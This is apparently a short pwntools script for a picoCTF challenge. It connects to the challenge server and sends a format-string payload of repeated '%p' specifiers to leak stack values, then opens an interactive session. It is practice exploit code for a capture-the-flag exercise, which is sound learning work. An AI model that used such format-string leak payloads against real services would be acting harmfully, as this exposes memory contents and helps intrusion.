from pwn import *

host = "rescued-float.picoctf.net"
port = 51692
p = remote(host, port)
# p = process("./vuln")

payload = b"%p,"*20
offset = 215

p.sendline(payload)

p.interactive()
